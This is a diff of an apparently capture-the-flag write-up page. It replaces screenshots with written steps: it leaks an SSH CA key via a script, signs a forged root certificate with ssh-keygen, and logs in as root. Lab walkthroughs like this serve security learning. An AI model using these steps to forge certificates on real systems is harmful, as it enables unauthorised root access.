@@ -309,18 +309,16 @@ with open("ca-it", "w") as f:
 	f.write(caKey)
 
 </code></pre>
-    
-<p>Using the provided script, we discover the 'Bash Globbing Vulnerability' and exploit it to leak the CA key.</p>
-<img src="/img/Ressource_screenshot/Pasted image27.png" alt="Leaking CA key">
 
-<p>We sign a new key pair with the leaked CA key.</p>
-<img src="/img/Ressource_screenshot/Pasted image28.png" alt="Signing key pair">
-
-<p>SSH to root with the signed key.</p>
-<img src="/img/Ressource_screenshot/Pasted image29.png" alt="Root access">
-
-<p>Finally, in the 'zzinter' user directory, we find a script that helps us sign an SSH key with a principal, allowing further exploitation.</p>
-<img src="/img/Ressource_screenshot/Pasted image30.png" alt="Script discovery">
-
-<p>Exploiting the script leads us to gain access to another system user with elevated privileges.</p>
-<img src="/img/Ressource_screenshot/Pasted image31.png" alt="User privilege escalation">
+<p>So before running this amazing script, we need to make a ssh key pair</p>
+<p>After running the script, we get the valid 'ca-it 'file leaked</p>
+<img src="/img/Ressource_screenshot/Pasted image 20240820003141.png" alt="cat it leaked">
+	
+<p>Now signing a new key pair with the freshly leaked certificate</p>
+<pre style="background-color: black; color: white;"><code>
+ssh-keygen -s ca-it -z 1234 -I root -V -100w:forever -n root_user rootKey.pub
+</code></pre>
+<p>And finally we can ssh to root with the following command</p>
+<pre style="background-color: black; color: white;"><code>
+ssh -o CertificateFile=rootKey-cert.pub -i rootKey root@localhost -p 2222
+</code></pre>
